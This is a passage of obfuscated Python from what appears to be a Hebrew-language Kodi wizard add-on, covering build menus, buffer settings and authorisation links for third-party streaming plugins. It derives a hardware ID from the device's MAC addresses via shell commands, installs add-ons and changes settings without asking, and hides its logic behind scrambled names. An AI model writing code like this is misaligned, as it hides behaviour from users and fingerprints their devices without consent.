     OOOOOO0O00000OO00 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1657
     O0O00O00OO0OOO0OO =re .compile ('link/ether (.+?) brd').findall (str (OOOOOO0O00000OO00 ))#line:1659
     O00OOO0OO0OO00O00 =0 #line:1660
     for O000OOOO0OO000OOO in O0O00O00OO0OOO0OO :#line:1661
      if O0O00O00OO0OOO0OO !='00:00:00:00:00:00':#line:1662
          OO000OOO00O00O0OO =O000OOOO0OO000OOO #line:1663
          O00OOO0OO0OO00O00 =O00OOO0OO0OO00O00 +int (OO000OOO00O00O0OO .replace (':',''),16 )#line:1664
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1666
       O000O0O00OOOO0O00 =0 #line:1667
       O00OOO0OO0OO00O00 =0 #line:1668
       OOO00O0OO0OO00000 =[]#line:1669
       O0OOO000OO00000OO =os .popen ("getmac").read ()#line:1670
       O0OOO000OO00000OO =O0OOO000OO00000OO .split ("\n")#line:1671
       for OOO0O00000O0O0000 in O0OOO000OO00000OO :#line:1673
            OOOO0000OO000OO0O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO0O00000O0O0000 ,re .I )#line:1674
            if OOOO0000OO000OO0O :#line:1675
                O0O00O00OO0OOO0OO =OOOO0000OO000OO0O .group ().replace ('-',':')#line:1676
                OOO00O0OO0OO00000 .append (O0O00O00OO0OOO0OO )#line:1677
                O00OOO0OO0OO00O00 =O00OOO0OO0OO00O00 +int (O0O00O00OO0OOO0OO .replace (':',''),16 )#line:1680
   else :#line:1682
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1683
   try :#line:1700
    return O00OOO0OO0OO00O00 #line:1701
   except :pass #line:1702
def getpass ():#line:1703
	disply_hwr2 ()#line:1705
def setpass ():#line:1706
    OO0O00OOO00O00O0O =xbmcgui .Dialog ()#line:1707
    OOO00OO0O0OO000O0 =''#line:1708
    OO0OO00OO0OOOOO00 =xbmc .Keyboard (OOO00OO0O0OO000O0 ,'הכנס סיסמה')#line:1710
    OO0OO00OO0OOOOO00 .doModal ()#line:1711
    if OO0OO00OO0OOOOO00 .isConfirmed ():#line:1712
           OO0OO00OO0OOOOO00 =OO0OO00OO0OOOOO00 .getText ()#line:1713
    wiz .setS ('pass',str (OO0OO00OO0OOOOO00 ))#line:1714
def setuname ():#line:1715
    O00O0O0OOO000O0O0 =''#line:1716
    OO0OOOO000OOOOO00 =xbmc .Keyboard (O00O0O0OOO000O0O0 ,'הכנס שם משתמש')#line:1717
    OO0OOOO000OOOOO00 .doModal ()#line:1718
    if OO0OOOO000OOOOO00 .isConfirmed ():#line:1719
           O00O0O0OOO000O0O0 =OO0OOOO000OOOOO00 .getText ()#line:1720
           wiz .setS ('user',str (O00O0O0OOO000O0O0 ))#line:1721
def powerkodi ():#line:1722
    os ._exit (1 )#line:1723
def buffer1 ():#line:1725
	OOOOO00OO0O0O0OO0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1726
	OO0O0O00O0OOO0O0O =xbmc .getInfoLabel ("System.Memory(total)")#line:1727
	O000O00OO0O0O0000 =xbmc .getInfoLabel ("System.FreeMemory")#line:1728
	OO00OO00O0OOO000O =re .sub ('[^0-9]','',O000O00OO0O0O0000 )#line:1729
	OO00OO00O0OOO000O =int (OO00OO00O0OOO000O )/3 #line:1730
	O00OOOO0OO0OOOOOO =OO00OO00O0OOO000O *1024 *1024 #line:1731
	try :O0O00OOOOO0O0O0OO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1732
	except :O0O00OOOOO0O0O0OO =16 #line:1733
	OOOO0O00OOOOOO0O0 =DIALOG .yesno ('FREE MEMORY: '+str (O000O00OO0O0O0000 ),'Based on your free Memory your optimal buffersize is: '+str (OO00OO00O0OOO000O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1736
	if OOOO0O00OOOOOO0O0 ==1 :#line:1737
		with open (OOOOO00OO0O0O0OO0 ,"w")as O00OO0O0000000OOO :#line:1738
			if O0O00OOOOO0O0O0OO >=17 :O0O0000O00OOO0OOO =xml_data_advSettings_New (str (O00OOOO0OO0OOOOOO ))#line:1739
			else :O0O0000O00OOO0OOO =xml_data_advSettings_old (str (O00OOOO0OO0OOOOOO ))#line:1740
			O00OO0O0000000OOO .write (O0O0000O00OOO0OOO )#line:1742
			DIALOG .ok ('Buffer Size Set to: '+str (O00OOOO0OO0OOOOOO ),'Please restart Kodi for settings to apply.','')#line:1743
	elif OOOO0O00OOOOOO0O0 ==0 :#line:1745
		O00OOOO0OO0OOOOOO =_O00000OOOO0O00OO0 (default =str (O00OOOO0OO0OOOOOO ),heading ="INPUT BUFFER SIZE")#line:1746
		with open (OOOOO00OO0O0O0OO0 ,"w")as O00OO0O0000000OOO :#line:1747
			if O0O00OOOOO0O0O0OO >=17 :O0O0000O00OOO0OOO =xml_data_advSettings_New (str (O00OOOO0OO0OOOOOO ))#line:1748
			else :O0O0000O00OOO0OOO =xml_data_advSettings_old (str (O00OOOO0OO0OOOOOO ))#line:1749
			O00OO0O0000000OOO .write (O0O0000O00OOO0OOO )#line:1750
			DIALOG .ok ('Buffer Size Set to: '+str (O00OOOO0OO0OOOOOO ),'Please restart Kodi for settings to apply.','')#line:1751
def xml_data_advSettings_old (OO0O000OOO0O00O00 ):#line:1752
	O00OO0O0O0OOO0000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0O000OOO0O00O00 #line:1762
	return O00OO0O0O0OOO0000 #line:1763
def xml_data_advSettings_New (O00OOO000O00O0000 ):#line:1765
	OOOOO0OOOO00OOO00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O00OOO000O00O0000 #line:1777
	return OOOOO0OOOO00OOO00 #line:1778
def write_ADV_SETTINGS_XML (OO00OO0OO0O0O0OOO ):#line:1779
    if not os .path .exists (xml_file ):#line:1780
        with open (xml_file ,"w")as OOO000OO000O0OO0O :#line:1781
            OOO000OO000O0OO0O .write (xml_data )#line:1782
def _O00000OOOO0O00OO0 (default ="",heading ="",hidden =False ):#line:1783
    ""#line:1784
    O00OO000OO0OO0O0O =xbmc .Keyboard (default ,heading ,hidden )#line:1785
    O00OO000OO0OO0O0O .doModal ()#line:1786
    if (O00OO000OO0OO0O0O .isConfirmed ()):#line:1787
        return unicode (O00OO000OO0OO0O0O .getText (),"utf-8")#line:1788
    return default #line:1789
def index ():#line:1791
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1792
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1793
	if AUTOUPDATE =='Yes':#line:1794
		if wiz .workingURL (WIZARDFILE )==True :#line:1795
			OOO0O00000OOO0OO0 =wiz .checkWizard ('version')#line:1796
			if OOO0O00000OOO0OO0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OOO0O00000OOO0OO0 ),'wizardupdate',themeit =THEME2 )#line:1797
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1798
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1799
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1800
	if len (BUILDNAME )>0 :#line:1801
		OOO000O0O000000O0 =wiz .checkBuild (BUILDNAME ,'version')#line:1802
		OOO00O00O0OO0OOOO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1803
		if OOO000O0O000000O0 >BUILDVERSION :OOO00O00O0OO0OOOO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OOO00O00O0OO0OOOO ,OOO000O0O000000O0 )#line:1804
		addDir (OOO00O00O0OO0OOOO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1806
		try :#line:1808
		     O0OOOO0000O0OOOOO =wiz .themeCount (BUILDNAME )#line:1809
		except :#line:1810
		   O0OOOO0000O0OOOOO =False #line:1811
		if not O0OOOO0000O0OOOOO ==False :#line:1812
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1813
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1814
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1817
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1818
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1819
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1823
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1825
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1827
def morsetup ():#line:1829
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1830
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1831
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1832
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1833
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1837
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1838
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1841
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1842
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1844
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1845
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1853
	setView ('files','viewType')#line:1854
def morsetup2 ():#line:1855
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1856
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1857
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1858
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1859
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1860
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1861
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1862
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1863
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1864
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1865
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1866
def fastupdate ():#line:1867
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1868
def forcefastupdate ():#line:1870
			OO0O0O0O000O00OO0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1871
			wiz .ForceFastUpDate (ADDONTITLE ,OO0O0O0O000O00OO0 )#line:1872
def rdsetup ():#line:1876
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1877
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1878
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1879
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1880
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1881
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1882
	setView ('files','viewType')#line:1883
def traktsetup ():#line:1885
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1886
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1887
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1888
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1889
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1890
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1891
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1892
	setView ('files','viewType')#line:1893
def resolveurlsetup ():#line:1895
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1896
def urlresolversetup ():#line:1897
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1898
def placentasetup ():#line:1900
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1901
def reptiliasetup ():#line:1902
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1903
def flixnetsetup ():#line:1904
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1905
def yodasetup ():#line:1906
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1907
def numberssetup ():#line:1908
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1909
def uranussetup ():#line:1910
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1911
def genesissetup ():#line:1912
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1913
def net_tools (view =None ):#line:1915
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1916
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1917
	setView ('files','viewType')#line:1919
def speedMenu ():#line:1920
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1921
def viewIP ():#line:1922
	OO0OOO000OO00O000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1936
	OO00OO000OO00OO00 =[];OO0OO0OO00O0000OO =0 #line:1937
	for O00OOO0O00OOOOOOO in OO0OOO000OO00O000 :#line:1938
		O000O00O0OOOO000O =wiz .getInfo (O00OOO0O00OOOOOOO )#line:1939
		O000000O0O0O0OOOO =0 #line:1940
		while O000O00O0OOOO000O =="Busy"and O000000O0O0O0OOOO <10 :#line:1941
			O000O00O0OOOO000O =wiz .getInfo (O00OOO0O00OOOOOOO );O000000O0O0O0OOOO +=1 ;wiz .log ("%s sleep %s"%(O00OOO0O00OOOOOOO ,str (O000000O0O0O0OOOO )));xbmc .sleep (1000 )#line:1942
		OO00OO000OO00OO00 .append (O000O00O0OOOO000O )#line:1943
		OO0OO0OO00O0000OO +=1 #line:1944
	O00000O0OOO0OOO0O ,O00OOOO0O0OO000O0 ,OOO0O0OO00OOO0OOO =getIP ()#line:1945
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO00OO00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1946
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O0OOO0OOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1947
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOO0O0OO000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1948
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0OO00OOO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1949
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO00OO00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1950
	setView ('files','viewType')#line:1951
def buildMenu ():#line:1953
	if USERNAME =='':#line:1954
		ADDON .openSettings ()#line:1955
		sys .exit ()#line:1956
	if PASSWORD =='':#line:1957
		ADDON .openSettings ()#line:1958
	OOO000O000OO0O0OO =u_list (SPEEDFILE )#line:1959
	(OOO000O000OO0O0OO )#line:1960
	OO0OOOO0O0O00OO0O =(wiz .workingURL (OOO000O000OO0O0OO ))#line:1961
	(OO0OOOO0O0O00OO0O )#line:1962
	OO0OOOO0O0O00OO0O =wiz .workingURL (SPEEDFILE )#line:1963
	if not OO0OOOO0O0O00OO0O ==True :#line:1964
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1965
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1966
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1967
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1968
		addFile ('%s'%OO0OOOO0O0O00OO0O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1969
	else :#line:1970
		O0OOOO0000O00OOOO ,OOOO000O0OO00O0OO ,OO0O0000OO00OOO00 ,OO00O0O00O00OOOOO ,OOOOOOO00O00OO000 ,O000OOOO0O00000O0 ,O0O00O00O0000O00O =wiz .buildCount ()#line:1971
		OO00000OO000O00OO =False ;OO0OO0OO000O0O000 =[]#line:1972
		if THIRDPARTY =='true':#line:1973
			if not THIRD1NAME ==''and not THIRD1URL =='':OO00000OO000O00OO =True ;OO0OO0OO000O0O000 .append ('1')#line:1974
			if not THIRD2NAME ==''and not THIRD2URL =='':OO00000OO000O00OO =True ;OO0OO0OO000O0O000 .append ('2')#line:1975
			if not THIRD3NAME ==''and not THIRD3URL =='':OO00000OO000O00OO =True ;OO0OO0OO000O0O000 .append ('3')#line:1976
		O00O0OOOOO0O0OO0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1977
		OOO0OOOO0OOO0OOO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O0OOOOO0O0OO0O )#line:1978
		if O0OOOO0000O00OOOO ==1 and OO00000OO000O00OO ==False :#line:1979
			for OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ,O0OOO00OOO00OO000 ,OOOOOO00OO000O000 ,O0OO0O0O0O00O00O0 ,O000OO000OOOOOO0O ,O0OO0O0O0OOOO0O0O ,OOO0OOOO0O0OO0O0O ,OOOOOOO0OO00O000O ,OOO0OO0OOOO00OOO0 in OOO0OOOO0OOO0OOO0 :#line:1980
				if not SHOWADULT =='true'and OOOOOOO0OO00O000O .lower ()=='yes':continue #line:1981
				if not DEVELOPER =='true'and wiz .strTest (OO0000OO0O0OO00O0 ):continue #line:1982
				viewBuild (OOO0OOOO0OOO0OOO0 [0 ][0 ])#line:1983
				return #line:1984
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1987
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1988
		if OO00000OO000O00OO ==True :#line:1989
			for OOO00OOO0OOO0OOO0 in OO0OO0OO000O0O000 :#line:1990
				OO0000OO0O0OO00O0 =eval ('THIRD%sNAME'%OOO00OOO0OOO0OOO0 )#line:1991
		if len (OOO0OOOO0OOO0OOO0 )>=1 :#line:1993
			if SEPERATE =='true':#line:1994
				for OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ,O0OOO00OOO00OO000 ,OOOOOO00OO000O000 ,O0OO0O0O0O00O00O0 ,O000OO000OOOOOO0O ,O0OO0O0O0OOOO0O0O ,OOO0OOOO0O0OO0O0O ,OOOOOOO0OO00O000O ,OOO0OO0OOOO00OOO0 in OOO0OOOO0OOO0OOO0 :#line:1995
					if not SHOWADULT =='true'and OOOOOOO0OO00O000O .lower ()=='yes':continue #line:1996
					if not DEVELOPER =='true'and wiz .strTest (OO0000OO0O0OO00O0 ):continue #line:1997
					O00O0000OOO00O0OO =createMenu ('install','',OO0000OO0O0OO00O0 )#line:1998
					addDir ('[%s] %s (v%s)'%(float (O0OO0O0O0O00O00O0 ),OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ),'viewbuild',OO0000OO0O0OO00O0 ,description =OOO0OO0OOOO00OOO0 ,fanart =OOO0OOOO0O0OO0O0O ,icon =O0OO0O0O0OOOO0O0O ,menu =O00O0000OOO00O0OO ,themeit =THEME2 )#line:1999
			else :#line:2000
				if OO00O0O00O00OOOOO >0 :#line:2001
					OO0O0OOOO000OOO00 ='+'if SHOW17 =='false'else '-'#line:2002
					if SHOW17 =='true':#line:2004
						for OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ,O0OOO00OOO00OO000 ,OOOOOO00OO000O000 ,O0OO0O0O0O00O00O0 ,O000OO000OOOOOO0O ,O0OO0O0O0OOOO0O0O ,OOO0OOOO0O0OO0O0O ,OOOOOOO0OO00O000O ,OOO0OO0OOOO00OOO0 in OOO0OOOO0OOO0OOO0 :#line:2006
							if not SHOWADULT =='true'and OOOOOOO0OO00O000O .lower ()=='yes':continue #line:2007
							if not DEVELOPER =='true'and wiz .strTest (OO0000OO0O0OO00O0 ):continue #line:2008
							OOOOOO00O00000O00 =int (float (O0OO0O0O0O00O00O0 ))#line:2009
							if OOOOOO00O00000O00 ==17 :#line:2010
								O00O0000OOO00O0OO =createMenu ('install','',OO0000OO0O0OO00O0 )#line:2011
								addDir ('[%s] %s (v%s)'%(float (O0OO0O0O0O00O00O0 ),OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ),'viewbuild',OO0000OO0O0OO00O0 ,description =OOO0OO0OOOO00OOO0 ,fanart =OOO0OOOO0O0OO0O0O ,icon =O0OO0O0O0OOOO0O0O ,menu =O00O0000OOO00O0OO ,themeit =THEME2 )#line:2012
				if OOOOOOO00O00OO000 >0 :#line:2013
					OO0O0OOOO000OOO00 ='+'if SHOW18 =='false'else '-'#line:2014
					if SHOW18 =='true':#line:2016
						for OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ,O0OOO00OOO00OO000 ,OOOOOO00OO000O000 ,O0OO0O0O0O00O00O0 ,O000OO000OOOOOO0O ,O0OO0O0O0OOOO0O0O ,OOO0OOOO0O0OO0O0O ,OOOOOOO0OO00O000O ,OOO0OO0OOOO00OOO0 in OOO0OOOO0OOO0OOO0 :#line:2018
							if not SHOWADULT =='true'and OOOOOOO0OO00O000O .lower ()=='yes':continue #line:2019
							if not DEVELOPER =='true'and wiz .strTest (OO0000OO0O0OO00O0 ):continue #line:2020
							OOOOOO00O00000O00 =int (float (O0OO0O0O0O00O00O0 ))#line:2021
							if OOOOOO00O00000O00 ==18 :#line:2022
								O00O0000OOO00O0OO =createMenu ('install','',OO0000OO0O0OO00O0 )#line:2023
								addDir ('[%s] %s (v%s)'%(float (O0OO0O0O0O00O00O0 ),OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ),'viewbuild',OO0000OO0O0OO00O0 ,description =OOO0OO0OOOO00OOO0 ,fanart =OOO0OOOO0O0OO0O0O ,icon =O0OO0O0O0OOOO0O0O ,menu =O00O0000OOO00O0OO ,themeit =THEME2 )#line:2024
				if OO0O0000OO00OOO00 >0 :#line:2025
					OO0O0OOOO000OOO00 ='+'if SHOW16 =='false'else '-'#line:2026
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OO0O0OOOO000OOO00 ,OO0O0000OO00OOO00 ),'togglesetting','show16',themeit =THEME3 )#line:2027
					if SHOW16 =='true':#line:2028
						for OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ,O0OOO00OOO00OO000 ,OOOOOO00OO000O000 ,O0OO0O0O0O00O00O0 ,O000OO000OOOOOO0O ,O0OO0O0O0OOOO0O0O ,OOO0OOOO0O0OO0O0O ,OOOOOOO0OO00O000O ,OOO0OO0OOOO00OOO0 in OOO0OOOO0OOO0OOO0 :#line:2029
							if not SHOWADULT =='true'and OOOOOOO0OO00O000O .lower ()=='yes':continue #line:2030
							if not DEVELOPER =='true'and wiz .strTest (OO0000OO0O0OO00O0 ):continue #line:2031
							OOOOOO00O00000O00 =int (float (O0OO0O0O0O00O00O0 ))#line:2032
							if OOOOOO00O00000O00 ==16 :#line:2033
								O00O0000OOO00O0OO =createMenu ('install','',OO0000OO0O0OO00O0 )#line:2034
								addDir ('[%s] %s (v%s)'%(float (O0OO0O0O0O00O00O0 ),OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ),'viewbuild',OO0000OO0O0OO00O0 ,description =OOO0OO0OOOO00OOO0 ,fanart =OOO0OOOO0O0OO0O0O ,icon =O0OO0O0O0OOOO0O0O ,menu =O00O0000OOO00O0OO ,themeit =THEME2 )#line:2035
				if OOOO000O0OO00O0OO >0 :#line:2036
					OO0O0OOOO000OOO00 ='+'if SHOW15 =='false'else '-'#line:2037
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OO0O0OOOO000OOO00 ,OOOO000O0OO00O0OO ),'togglesetting','show15',themeit =THEME3 )#line:2038
					if SHOW15 =='true':#line:2039
						for OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ,O0OOO00OOO00OO000 ,OOOOOO00OO000O000 ,O0OO0O0O0O00O00O0 ,O000OO000OOOOOO0O ,O0OO0O0O0OOOO0O0O ,OOO0OOOO0O0OO0O0O ,OOOOOOO0OO00O000O ,OOO0OO0OOOO00OOO0 in OOO0OOOO0OOO0OOO0 :#line:2040
							if not SHOWADULT =='true'and OOOOOOO0OO00O000O .lower ()=='yes':continue #line:2041
							if not DEVELOPER =='true'and wiz .strTest (OO0000OO0O0OO00O0 ):continue #line:2042
							OOOOOO00O00000O00 =int (float (O0OO0O0O0O00O00O0 ))#line:2043
							if OOOOOO00O00000O00 <=15 :#line:2044
								O00O0000OOO00O0OO =createMenu ('install','',OO0000OO0O0OO00O0 )#line:2045
								addDir ('[%s] %s (v%s)'%(float (O0OO0O0O0O00O00O0 ),OO0000OO0O0OO00O0 ,OO0OOOOO0OO0O0O0O ),'viewbuild',OO0000OO0O0OO00O0 ,description =OOO0OO0OOOO00OOO0 ,fanart =OOO0OOOO0O0OO0O0O ,icon =O0OO0O0O0OOOO0O0O ,menu =O00O0000OOO00O0OO ,themeit =THEME2 )#line:2046
		elif O0O00O00O0000O00O >0 :#line:2047
			if O000OOOO0O00000O0 >0 :#line:2048
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2049
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2050
			else :#line:2051
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2052
